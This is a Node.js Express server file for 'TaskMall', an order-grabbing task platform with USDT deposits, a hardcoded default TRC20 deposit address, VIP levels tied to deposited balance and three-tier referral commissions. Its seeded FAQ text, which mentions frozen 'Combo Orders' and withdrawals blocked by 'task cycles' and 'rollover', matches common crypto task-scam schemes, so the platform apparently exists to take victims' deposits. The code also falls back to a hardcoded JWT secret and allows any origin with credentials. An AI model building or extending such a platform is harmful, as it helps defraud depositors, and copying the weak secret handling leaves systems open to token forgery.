/**
 * TaskMall 平台 - Express 主入口
 * 采用标准 MVC 架构，物理隔离前后端
 */
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const path = require('path');
const config = require('./config');
const { getDb } = require('./db');

// 创建 Express 应用
const app = express();

// 信任代理（保证 req.ip / X-Forwarded-For 正确）
app.set('trust proxy', 1);

// ==================== 中间件配置 ====================
// 安全头
app.use(helmet({
  contentSecurityPolicy: false // PWA 需要
}));

// CORS（允许前端跨域）
app.use(cors({
  origin: true,
  credentials: true
}));

// JSON 解析
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// 静态文件服务（public 目录）
app.use('/public', express.static(path.join(__dirname, '../public')));

// 请求日志（开发环境）
if (config.env === 'development') {
  app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
  });
}

// 注入数据库连接到请求对象
app.use((req, res, next) => {
  req.db = getDb();
  next();
});

// 全局维护模式：maintenance_mode=1 时仅允许健康检查、配置、管理员登录及已带管理员 token 的请求
app.use((req, res, next) => {
  try {
    const db = getDb();
    const row = db.prepare("SELECT value FROM settings WHERE key = 'maintenance_mode'").get();
    if (!row || row.value !== '1') return next();
    const p = req.path;
    if (p === '/api/health' || p === '/api/config') return next();
    if (p === '/api/auth/admin/login' && req.method === 'POST') return next();
    const auth = req.headers.authorization;
    if (auth && auth.startsWith('Bearer ')) {
      try {
        const jwt = require('jsonwebtoken');
        const secret = process.env.JWT_SECRET || 'taskmall-secret';
        const decoded = jwt.verify(auth.slice(7), secret);
        if (decoded && decoded.role && ['SuperAdmin', 'Admin', 'Finance', 'Support'].includes(decoded.role)) return next();
      } catch (e) { /* token 无效 */ }
    }
    res.status(503).json({ success: false, message: '系统维护中，请稍后再试' });
  } catch (e) { next(); }
});

// ==========================================
// 公共配置接口 (Public Config)
// ==========================================
app.get('/api/config', (req, res) => {
    const db = require('./db').getDb();
    try {
        // 只读取必要的公开字段，不暴露敏感信息
        const keys = ['announcement', 'service_url', 'withdraw_open', 'withdraw_fee', 'withdraw_min', 'withdraw_max', 'withdraw_fee_type', 'withdraw_fee_value', 'about_us', 'invitation_rule', 'vip_rule', 'faq', 'help_center_items', 'terms_content', 'privacy_content', 'risk_disclaimer_content', 'deposit_address', 'deposit_channels', 'deposit_min_amount', 'deposit_max_amount', 'deposit_require_hash_or_screenshot', 'deposit_tips', 'deposit_maintenance', 'deposit_daily_limit', 'withdraw_channels', 'withdraw_tips', 'withdraw_maintenance', 'withdraw_daily_count_limit', 'withdraw_daily_amount_limit', 'home_banner_1', 'home_banner_2', 'home_banner_3'];
        const settings = db.prepare(`SELECT key, value FROM settings WHERE key IN (${keys.map(() => '?').join(',')})`).all(...keys);
        
        const config = {};
        settings.forEach(s => config[s.key] = s.value);
        
        // 兜底默认值
        if (!config.service_url) config.service_url = '#';
        if (!config.announcement) config.announcement = 'Welcome!';
        if (!config.deposit_address) config.deposit_address = 'T9yD14Nj9j7xAB4dbGeiX9h8UpjqGXX7Az';
        
        res.setHeader('Cache-Control', 'public, max-age=60');
        res.json({ success: true, data: config });
    } catch (err) {
        console.error('Config Error:', err);
        res.json({ success: true, data: { announcement: 'System Error', service_url: '#' } });
    }
});

// ==================== API 路由 ====================
const authRoutes = require('./routes/auth');
const userRoutes = require('./routes/user');
const adminRoutes = require('./routes/admin');
const agentRoutes = require('./routes/agent');
const taskRoutes = require('./routes/task');
const financeRoutes = require('./routes/finance');
const { verifyToken } = require('./utils/jwt');

const ADMIN_ROLES = ['SuperAdmin', 'Admin', 'Finance', 'Support'];
function checkAdmin(req, res, next) {
    const auth = req.headers['authorization'];
    if (!auth) return res.status(401).json({ success: false, error: 'Unauthorized' });
    const token = auth.startsWith('Bearer ') ? auth.slice(7) : auth;
    const decoded = verifyToken(token);
    if (!decoded || !ADMIN_ROLES.includes(decoded.role)) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    req.user = decoded;
    next();
}

// 数据分析接口在 app 层注册，避免路由未加载导致 404
app.get('/api/admin/reports/finance-summary', checkAdmin, (req, res) => {
    const db = getDb();
    const dateFrom = (req.query.date_from || '').trim();
    const dateTo = (req.query.date_to || '').trim();
    try {
        let where = ' WHERE 1=1 ';
        const params = [];
        if (dateFrom) { where += " AND date(created_at) >= ? "; params.push(dateFrom); }
        if (dateTo) { where += " AND date(created_at) <= ? "; params.push(dateTo); }
        try {
            const rows = db.prepare("SELECT type, COUNT(*) as count, IFNULL(SUM(amount),0) as total FROM transactions " + where + " GROUP BY type").all(...params);
            return res.json({ success: true, data: rows || [] });
        } catch (e1) {
            try {
                const rows2 = db.prepare("SELECT type, COUNT(*) as count, IFNULL(SUM(amount),0) as total FROM ledger " + where + " GROUP BY type").all(...params);
                return res.json({ success: true, data: rows2 || [] });
            } catch (e2) {
                return res.json({ success: true, data: [] });
            }
        }
    } catch (err) {
        console.error('reports/finance-summary error:', err);
        res.status(500).json({ success: false, message: err.message });
    }
});
app.get('/api/admin/reports/balance-check', checkAdmin, (req, res) => {
    try {
        const db = getDb();
        const userBalance = db.prepare("SELECT IFNULL(SUM(balance),0) as t FROM users WHERE role = 'User'").get();
        const totalDeposit = db.prepare("SELECT IFNULL(SUM(amount),0) as t FROM deposits WHERE status = 'approved'").get();
        const totalWithdraw = db.prepare("SELECT IFNULL(SUM(amount),0) as t FROM withdrawals WHERE status IN ('approved','paid')").get();
        let totalCommission = { t: 0 }, totalManualAdd = { t: 0 }, totalManualDeduct = { t: 0 };
        try {
            totalCommission = db.prepare("SELECT IFNULL(SUM(amount),0) as t FROM transactions WHERE type = 'task_commission'").get();
            totalManualAdd = db.prepare("SELECT IFNULL(SUM(amount),0) as t FROM transactions WHERE type = 'system_add'").get();
            totalManualDeduct = db.prepare("SELECT IFNULL(SUM(amount),0) as t FROM transactions WHERE type = 'system_deduct'").get();
        } catch (e) {
            try {
                totalManualAdd = db.prepare("SELECT IFNULL(SUM(amount),0) as t FROM ledger WHERE type = 'system_add'").get();
                totalManualDeduct = db.prepare("SELECT IFNULL(SUM(amount),0) as t FROM ledger WHERE type = 'system_deduct'").get();
            } catch (e2) { totalManualAdd = { t: 0 }; totalManualDeduct = { t: 0 }; }
        }
        res.json({
            success: true,
            data: {
                user_total_balance: userBalance ? userBalance.t : 0,
                total_deposit: totalDeposit ? totalDeposit.t : 0,
                total_withdraw: totalWithdraw ? totalWithdraw.t : 0,
                total_commission: totalCommission ? totalCommission.t : 0,
                total_manual_add: totalManualAdd ? totalManualAdd.t : 0,
                total_manual_deduct: totalManualDeduct ? totalManualDeduct.t : 0
            }
        });
    } catch (err) {
        console.error('reports/balance-check error:', err);
        res.status(500).json({ success: false, message: err.message });
    }
});
app.get('/api/admin/reports/invite-summary', checkAdmin, (req, res) => {
    try {
        const db = getDb();
        const dateFrom = (req.query.date_from || '').trim();
        const dateTo = (req.query.date_to || '').trim();
        let where = " WHERE u.role = 'User' AND u.referred_by IS NOT NULL AND u.referred_by != '' ";
        const params = [];
        if (dateFrom) { where += " AND date(u.created_at) >= ? "; params.push(dateFrom); }
        if (dateTo) { where += " AND date(u.created_at) <= ? "; params.push(dateTo); }
        const list = db.prepare(
            "SELECT u.referred_by as invite_code, COUNT(DISTINCT u.id) as reg_count FROM users u " + where + " GROUP BY u.referred_by ORDER BY reg_count DESC LIMIT 200"
        ).all(...params);
        const summary = list.map(row => {
            const teamIds = db.prepare("SELECT id FROM users WHERE referred_by = ?").all(row.invite_code).map(r => r.id);
            let total_deposit = 0;
            if (teamIds.length) {
                const ph = teamIds.map(() => '?').join(',');
                const r = db.prepare("SELECT IFNULL(SUM(amount),0) as t FROM deposits WHERE user_id IN (" + ph + ") AND status = 'approved'").get(...teamIds);
                total_deposit = r ? r.t : 0;
            }
            return { invite_code: row.invite_code, reg_count: row.reg_count, total_deposit };
        });
        res.json({ success: true, data: summary });
    } catch (err) {
        console.error('reports/invite-summary error:', err);
        res.status(500).json({ success: false, message: err.message });
    }
});

app.use('/api/auth', authRoutes);
app.use('/api/user', userRoutes);
if (typeof adminRoutes.getUsersHandler === 'function') app.get('/api/admin/users', checkAdmin, adminRoutes.getUsersHandler);
app.use('/api/admin', adminRoutes);
app.use('/api/agent', agentRoutes);
app.use('/api/task', taskRoutes);
app.use('/api/finance', financeRoutes);

// === 任务大厅路由 ===
app.get('/grab', (req, res) => {
  // 渲染新的 grab.html
  res.sendFile(path.join(__dirname, '../views/user/grab.html'));
});

// Download App (PWA 引导页)
app.get('/download.html', (req, res) => {
  res.sendFile(path.join(__dirname, '../views/user/download.html'));
});

// 健康检查（含 DB 探活，失败时 503 便于监控/负载均衡）
app.get('/api/health', (req, res) => {
  let dbOk = false;
  try {
    const db = getDb();
    db.prepare('SELECT 1').get();
    dbOk = true;
  } catch (e) {
    console.error('Health check DB failed:', e.message);
  }
  if (!dbOk) {
    res.status(503).json({
      success: false,
      data: { status: 'unhealthy', reason: 'database', timestamp: new Date().toISOString(), env: config.env }
    });
    return;
  }
  res.json({
    success: true,
    data: {
      status: 'ok',
      timestamp: new Date().toISOString(),
      env: config.env
    }
  });
});

// ==================== 错误处理 ====================
// 404 处理
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'API endpoint not found'
  });
});

// 全局错误处理
app.use((err, req, res, next) => {
  console.error('❌ Server Error:', err);
  
  res.status(err.status || 500).json({
    success: false,
    error: config.env === 'production' 
      ? 'Internal Server Error' 
      : err.message
  });
});

// ==================== 初始化默认规则文案 ====================
function initDefaultRules() {
  const db = require('./db').getDb();
  
  // 1. 定义专业文案 (支持 HTML 换行)
  const defaults = {
    // 邀请规则 (三级分销模型)
    invitation_rule: `
        <div style="line-height:1.6; color:#4a5568;">
            <h4 style="color:#2d3748; margin-bottom:10px;">🤝 Share & Earn Program</h4>
            <p>Invite friends to join TaskMall and earn passive income daily! We offer a generous 3-tier referral reward system:</p>
            <ul style="margin:15px 0; padding-left:20px;">
                <li><strong>Level 1 (Direct):</strong> Earn <span style="color:#e53e3e;">16%</span> of their daily income.</li>
                <li><strong>Level 2 (Indirect):</strong> Earn <span style="color:#e53e3e;">8%</span> of their daily income.</li>
                <li><strong>Level 3 (Team):</strong> Earn <span style="color:#e53e3e;">4%</span> of their daily income.</li>
            </ul>
            <p style="font-size:12px; color:#718096;">*Rewards are calculated and settled automatically at 00:00 system time every day.</p>
        </div>`,

    // VIP 规则 (等级体系)
    vip_rule: `
        <div style="line-height:1.6; color:#4a5568;">
            <h4 style="color:#2d3748; margin-bottom:10px;">👑 VIP Membership Levels</h4>
            <p>Upgrade your VIP level to unlock higher commission rates and more daily orders.</p>
            <div style="overflow-x:auto; margin-top:15px;">
                <table style="width:100%; border-collapse:collapse; font-size:13px; text-align:center;">
                    <tr style="background:#edf2f7; color:#2d3748;">
                        <th style="padding:8px;">Level</th>
                        <th style="padding:8px;">Balance</th>
                        <th style="padding:8px;">Rate</th>
                        <th style="padding:8px;">Orders</th>
                    </tr>
                    <tr style="border-bottom:1px solid #eee;"><td>VIP 1</td><td>0+ U</td><td>0.5%</td><td>40</td></tr>
                    <tr style="border-bottom:1px solid #eee;"><td>VIP 2</td><td>100+ U</td><td>1.0%</td><td>45</td></tr>
                    <tr style="border-bottom:1px solid #eee;"><td>VIP 3</td><td>500+ U</td><td>1.5%</td><td>50</td></tr>
                    <tr style="border-bottom:1px solid #eee;"><td>VIP 4</td><td>2000+ U</td><td>2.0%</td><td>55</td></tr>
                    <tr style="border-bottom:1px solid #eee;"><td>VIP 5</td><td>10000+ U</td><td>2.5%</td><td>60</td></tr>
                </table>
            </div>
            <p style="margin-top:15px; font-size:12px;"><strong>Auto Upgrade:</strong> The system will automatically upgrade your level when your account balance meets the requirements.</p>
        </div>`,

    // FAQ (常见问题)
    faq: `
        <div style="line-height:1.6; color:#4a5568;">
            <h4 style="color:#2d3748; margin-bottom:15px;">❓ Frequently Asked Questions</h4>
            
            <div style="margin-bottom:15px;">
                <strong style="color:#3182ce;">Q: How do I deposit?</strong>
                <p style="margin-top:5px; font-size:13px;">A: Go to the "Deposit" page, copy the official TRC20 address, and transfer USDT from your crypto wallet. It usually arrives within 5-10 minutes.</p>
            </div>

            <div style="margin-bottom:15px;">
                <strong style="color:#3182ce;">Q: What is the minimum withdrawal?</strong>
                <p style="margin-top:5px; font-size:13px;">A: The minimum withdrawal amount is <strong>10 USDT</strong>. Transfers are processed 24/7.</p>
            </div>

            <div style="margin-bottom:15px;">
                <strong style="color:#3182ce;">Q: Why is my order frozen?</strong>
                <p style="margin-top:5px; font-size:13px;">A: This may happen if you trigger a "Combo Order" or have network issues. Please contact our 24/7 Online Support to resolve it immediately.</p>
            </div>
        </div>`
  };

  // 2. 写入数据库 (如果不存在才写入)
  try {
    const check = db.prepare('SELECT value FROM settings WHERE key = ?');
    const insert = db.prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)');
    const update = db.prepare('UPDATE settings SET value = ? WHERE key = ? AND (value IS NULL OR value = "")');

    for (const [key, content] of Object.entries(defaults)) {
      // 尝试插入（如果key不存在）
      insert.run(key, content);
      // 尝试更新（如果key存在但内容为空）
      update.run(content, key);
    }
    console.log("✅ Default rules populated successfully.");
  } catch (e) {
    console.error("Failed to init rules:", e);
  }
}

// 执行初始化
initDefaultRules();

// === 强制更新规则文案 (Force Update English Content) ===
function forceUpdateContent() {
    const db = require('./db').getDb();
    
    // 1. 邀请规则 (Invitation Rules)
    const inviteContent = `
        <div style="padding:10px;">
            <h3 style="color:#2563eb; font-weight:bold; margin-bottom:10px;">🤝 Global Partner Program</h3>
            <p style="color:#4b5563; font-size:13px; margin-bottom:15px;">Invite friends to join and earn passive income. We offer a 3-tier commission structure:</p>
            <div style="background:#eff6ff; padding:15px; border-radius:8px; margin-bottom:15px;">
                <p style="margin:5px 0;"><strong>Tier 1 (Direct):</strong> <span style="color:#2563eb;">16%</span> Commission</p>
                <p style="margin:5px 0;"><strong>Tier 2 (Indirect):</strong> <span style="color:#2563eb;">8%</span> Commission</p>
                <p style="margin:5px 0;"><strong>Tier 3 (Team):</strong> <span style="color:#2563eb;">4%</span> Commission</p>
            </div>
            <p style="font-size:12px; color:#9ca3af;">* Rewards are settled daily at 00:00.</p>
        </div>`;

    // 2. VIP 规则 (VIP Rules)
    const vipContent = `
        <div style="padding:10px;">
            <h3 style="color:#d97706; font-weight:bold; margin-bottom:10px;">👑 VIP Levels</h3>
            <p style="color:#4b5563; font-size:13px; margin-bottom:15px;">Higher levels unlock higher income rates.</p>
            <table style="width:100%; font-size:13px; text-align:center; border-collapse:collapse;">
                <tr style="background:#f3f4f6; color:#374151;">
                    <th style="padding:8px; border:1px solid #e5e7eb;">Level</th>
                    <th style="padding:8px; border:1px solid #e5e7eb;">Balance</th>
                    <th style="padding:8px; border:1px solid #e5e7eb;">Rate</th>
                </tr>
                <tr><td style="padding:8px; border:1px solid #e5e7eb;">VIP 1</td><td>0+</td><td>0.5%</td></tr>
                <tr><td style="padding:8px; border:1px solid #e5e7eb;">VIP 2</td><td>100+</td><td>1.0%</td></tr>
                <tr><td style="padding:8px; border:1px solid #e5e7eb;">VIP 3</td><td>500+</td><td>1.5%</td></tr>
                <tr><td style="padding:8px; border:1px solid #e5e7eb;">VIP 4</td><td>2000+</td><td>2.0%</td></tr>
                <tr><td style="padding:8px; border:1px solid #e5e7eb;">VIP 5</td><td>10000+</td><td>2.5%</td></tr>
            </table>
        </div>`;

    // 3. FAQ（完整版，后端固定 HTML，分段清晰）
    const faqContent = `
        <div style="padding:12px 10px; line-height:1.75; color:#4b5563; font-size:14px;">
            <h3 style="color:#1f2937; font-size:16px; font-weight:700; margin:0 0 14px 0; padding-bottom:8px; border-bottom:2px solid #e5e7eb;">I. ACCOUNT & SECURITY</h3>
            <div style="margin-bottom:18px;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">How do I register an account?</p>
                <p style="margin:0 0 16px; font-size:14px;">Click the "Sign Up" button, enter your mobile number or email, and set a strong password. Each user is allowed only one account.</p>
            </div>
            <div style="margin-bottom:18px;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">What if I forget my password?</p>
                <p style="margin:0 0 16px; font-size:14px;">Please contact our Online Support. For security reasons, you will need to verify your identity before resetting.</p>
            </div>
            <div style="margin-bottom:24px;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">Is my personal information safe?</p>
                <p style="margin:0; font-size:14px;">Yes, we use advanced SSL encryption to ensure that all your data and transaction records are fully protected.</p>
            </div>

            <h3 style="color:#1f2937; font-size:16px; font-weight:700; margin:24px 0 14px; padding-bottom:8px; border-bottom:2px solid #e5e7eb;">II. ORDER GRABBING RULES</h3>
            <div style="margin-bottom:18px;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">How to start grabbing orders?</p>
                <p style="margin:0 0 16px; font-size:14px;">Go to the "Home" or "Task" page and click "Start Grabbing." The system will automatically match you with a merchant order based on your current balance.</p>
            </div>
            <div style="margin-bottom:18px;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">Why is my account balance insufficient to grab orders?</p>
                <p style="margin:0 0 16px; font-size:14px;">Each order requires a minimum account balance. If your balance is lower than the product price in your VIP tier, you cannot grab orders.</p>
            </div>
            <div style="margin-bottom:24px;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">What is a "Pending Order"?</p>
                <p style="margin:0; font-size:14px;">If you exit the app without clicking "Submit" after grabbing an order, it becomes pending. You must complete it in your "Order Record" to continue.</p>
            </div>

            <h3 style="color:#1f2937; font-size:16px; font-weight:700; margin:24px 0 14px; padding-bottom:8px; border-bottom:2px solid #e5e7eb;">III. DEPOSIT & WITHDRAWAL</h3>
            <div style="margin-bottom:18px;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">How do I deposit funds?</p>
                <p style="margin:0 0 16px; font-size:14px;">Navigate to "Deposit," select your preferred cryptocurrency (e.g., USDT-TRC20), and transfer the amount to the provided wallet address.</p>
            </div>
            <div style="margin-bottom:18px;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">What is the minimum withdrawal amount?</p>
                <p style="margin:0 0 16px; font-size:14px;">The minimum withdrawal is $20.00. Processing times usually range from 1 to 24 hours.</p>
            </div>
            <div style="margin-bottom:24px;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">Why was my withdrawal rejected?</p>
                <p style="margin:0; font-size:14px;">Rejections usually happen due to: 1. Unfinished task cycles; 2. Incorrect wallet address; 3. Insufficient turnover (Rollover) requirements.</p>
            </div>

            <h3 style="color:#1f2937; font-size:16px; font-weight:700; margin:24px 0 14px; padding-bottom:8px; border-bottom:2px solid #e5e7eb;">IV. VIP LEVELS & COMMISSIONS</h3>
            <div style="margin-bottom:18px;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">How are commissions calculated?</p>
                <p style="margin:0 0 16px; font-size:14px;">Commissions are based on the total order value. Higher VIP levels grant higher commission percentages (e.g., VIP1: 0.3%, VIP5: 0.8%).</p>
            </div>
            <div style="margin-bottom:24px;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">How do I upgrade to a higher VIP level?</p>
                <p style="margin:0; font-size:14px;">You can upgrade by reaching the required account balance or by inviting a certain number of active subordinates. Check the "VIP" page for details.</p>
            </div>

            <h3 style="color:#1f2937; font-size:16px; font-weight:700; margin:24px 0 14px; padding-bottom:8px; border-bottom:2px solid #e5e7eb;">V. REFERRAL PROGRAM</h3>
            <div style="margin-bottom:0;">
                <p style="font-weight:600; color:#1f2937; margin-bottom:6px;">Can I earn by inviting friends?</p>
                <p style="margin:0; font-size:14px;">Yes! You earn a percentage of the commission every time your subordinates complete a task. We offer a 3-tier rewards system (Level 1, Level 2, and Level 3).</p>
            </div>
        </div>`;

    try {
        const getVal = db.prepare("SELECT value FROM settings WHERE key = ?");
        const insertOrUpdate = db.prepare("INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value");
        // 邀请规则、VIP 规则：仅当为空时才写入
        const keys = ['invitation_rule', 'vip_rule'];
        const contents = [inviteContent, vipContent];
        for (let i = 0; i < keys.length; i++) {
            const row = getVal.get(keys[i]);
            if (!row || !row.value || String(row.value).trim() === '') {
                insertOrUpdate.run(keys[i], contents[i]);
                console.log("✅ Default content set for " + keys[i]);
            }
        }
        // FAQ：强制写入为后端定义好的 HTML（分段清晰、样式统一）
        insertOrUpdate.run('faq', faqContent);
        console.log("✅ FAQ content updated (backend default)");
    } catch (e) {
        console.error("Injection failed:", e);
    }
}

forceUpdateContent();

// ==================== 启动服务器 ====================
// 生产环境检查 JWT_SECRET
if (config.env === 'production' && (!process.env.JWT_SECRET || process.env.JWT_SECRET === 'default-secret-change-in-production')) {
  console.warn('⚠️  WARNING: JWT_SECRET 未设置或使用默认值，生产环境请设置环境变量 JWT_SECRET');
}

const server = app.listen(config.port, () => {
  console.log('');
  console.log('🚀 TaskMall Platform Server Started');
  console.log('━'.repeat(50));
  console.log(`📡 Server: http://localhost:${config.port}`);
  console.log(`🌍 Environment: ${config.env}`);
  console.log(`💾 Database: ${config.database.path}`);
  console.log('━'.repeat(50));
  console.log('');
});

// 优雅关闭
process.on('SIGTERM', () => {
  console.log('SIGTERM 信号接收，正在关闭服务器...');
  server.close(() => {
    console.log('服务器已关闭');
    process.exit(0);
  });
});

module.exports = app;
